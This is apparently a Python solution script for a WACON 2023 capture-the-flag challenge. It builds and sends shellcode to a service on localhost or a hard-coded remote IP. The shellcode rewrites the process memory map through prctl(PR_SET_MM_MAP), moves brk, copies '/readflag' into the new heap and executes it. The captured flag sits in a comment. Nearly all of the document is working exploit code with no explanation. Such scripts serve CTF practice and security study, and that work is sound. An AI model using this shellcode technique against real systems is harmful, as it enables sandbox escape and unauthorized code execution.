#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':1337}, \
                        remote  = {'host':'58.229.185.47', 'port':1337})
env.select()

#==========

'''
struct prctl_mm_map {
	__u64	start_code;		/* code section bounds */
	__u64	end_code;
	__u64	start_data;		/* data section bounds */
	__u64	end_data;
	__u64	start_brk;		/* heap for brk() syscall */
	__u64	brk;
	__u64	start_stack;		/* stack starts at */
	__u64	arg_start;		/* command line arguments bounds */
	__u64	arg_end;
	__u64	env_start;		/* environment variables bounds */
	__u64	env_end;
	__u64	*auxv;			/* auxiliary vector */
	__u32	auxv_size;		/* vector size */
	__u32	exe_fd;			/* /proc/$pid/exe link file */
};
'''

def attack(conn, **kwargs):
    '''
    shellasm  = shellcraft.shmget(0, 100, 0o600)    # IPC_PRIVATE: 0
    shellasm += shellcraft.shmat('rax', 0x133700000000, 0)
    shellasm += shellcraft.pushstr(b'/readflag')
    shellasm += shellcraft.strcpy('rax', 'rsp')
    shellasm += shellcraft.execve('rax', 0, 0)
    '''

    addr_brk = 0x133700000000

    prctl_mm_map  = flat(0x133600000000, 0x133600001000)
    prctl_mm_map += flat(0x133600001000, 0x133600001000)
    prctl_mm_map += flat(addr_brk, addr_brk)
    prctl_mm_map += flat(0x133800000000, 0x133800000000, 0x133800000000, 0x133800000000, 0x133800000000)
    prctl_mm_map += p64(0) + p32(0)
    prctl_mm_map += p32(0xffffffff)

    shellasm  = shellcraft.pushstr(prctl_mm_map, False)
    # shellasm  = shellcraft.prctl(PR_SET_MM, PR_SET_MM_MAP, ...)
    shellasm += shellcraft.prctl(35, 14, 'rsp', len(prctl_mm_map), 0)
    shellasm += shellcraft.brk(addr_brk + 0x1000)

    shellasm += shellcraft.pushstr('/readflag')
    shellasm += shellcraft.mov('rax', addr_brk)
    shellasm += shellcraft.memcpy('rax', 'rsp', 10)

    shellasm += shellcraft.execve('rax', 0, 0)

    conn.sendlineafter(b'shellcode: ', asm(shellasm))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # WACON2023{wow-you-really-mmaped-it-df23ab2}

if __name__=='__main__':
    main()

#==========
